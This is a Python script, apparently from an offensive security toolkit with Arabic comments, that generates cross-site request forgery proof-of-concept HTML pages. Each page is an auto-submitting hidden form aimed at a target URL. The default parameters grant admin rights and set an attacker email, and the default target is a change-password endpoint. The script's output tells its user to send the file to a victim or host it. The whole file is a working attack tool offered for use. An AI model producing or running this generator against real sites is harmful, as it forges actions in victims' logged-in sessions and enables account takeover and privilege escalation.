#!/usr/bin/env python3
import os
from termcolor import cprint
from datetime import datetime

class CSRFExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.output_dir = "exploits/csrf"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def generate_poc(self, method="POST", params=None):
        """توليد ملف HTML للثغرة تلقائياً"""
        if params is None:
            params = {"action": "update", "admin": "true", "email": "hacker@alzill.com"}

        timestamp = datetime.now().strftime("%H%M%S")
        filename = f"{self.output_dir}/csrf_poc_{timestamp}.html"
        
        # بناء الـ Form بناءً على المعطيات
        form_inputs = ""
        for key, value in params.items():
            form_inputs += f'    <input type="hidden" name="{key}" value="{value}" />\n'

        html_content = f"""
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="{self.target_url}" method="{method}">
{form_inputs}
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // تنفيذ الطلب تلقائياً عند فتح الصفحة
      document.forms[0].submit();
    </script>
  </body>
</html>
"""
        try:
            with open(filename, "w") as f:
                f.write(html_content)
            
            cprint(f"\n[+] CSRF PoC Generated Successfully!", "green", attrs=['bold'])
            cprint(f"[*] Method: {method}", "cyan")
            cprint(f"[*] Payload saved to: {filename}", "white")
            cprint(f"[!] Send this file to the victim or host it on your server.", "yellow")
            return filename
        except Exception as e:
            cprint(f"[!] Error generating CSRF PoC: {e}", "red")
            return None

def run_exploit(url, method="POST", params=None):
    exploiter = CSRFExploiter(url)
    return exploiter.generate_poc(method, params)

if __name__ == "__main__":
    # تجربة تشغيل سريعة
    test_url = "https://example.com/api/change-password"
    run_exploit(test_url)
